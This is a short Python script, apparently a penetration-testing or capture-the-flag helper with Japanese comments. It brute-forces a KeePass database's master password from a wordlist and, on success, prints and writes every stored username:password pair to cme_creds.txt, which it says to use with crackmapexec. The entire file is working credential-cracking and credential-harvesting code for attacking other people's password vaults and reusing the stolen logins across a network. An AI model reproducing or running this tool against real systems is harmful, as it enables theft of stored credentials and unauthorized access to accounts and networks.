import sys
from pykeepass import PyKeePass
from pykeepass.exceptions import CredentialsError

def title_to_username(title):
    # Titleを小文字にして空白はピリオドに変換、カンマやハイフンは削除
    return title.lower().replace(' ', '.').replace(',', '').replace('-', '.')

def try_passwords_and_export(kdbx_path, wordlist_path):
    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
        passwords = f.readlines()

    for i, password in enumerate(passwords):
        password = password.strip()
        try:
            kp = PyKeePass(kdbx_path, password=password)
            print(f"\n[+] SUCCESS! Password found: {password}")
            print("[*] Extracting entries and exporting to cme_creds.txt ...")

            with open("cme_creds.txt", "w") as fout:
                for entry in kp.entries:
                    if entry.password:
                        user = entry.username
                        if not user:
                            user = title_to_username(entry.title)
                        fout.write(f"{user}:{entry.password}\n")
                        print(f"{user}:{entry.password}")
            print("\n[+] Export complete. Use cme_creds.txt with crackmapexec.")
            return
        except CredentialsError:
            if i % 100 == 0:
                print(f"[-] Tried {i} passwords...", end='\r')
    print("\n[-] Password not found in wordlist.")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 keepass4brute_and_export.py <.kdbx file> <wordlist>")
        sys.exit(1)
    try_passwords_and_export(sys.argv[1], sys.argv[2])
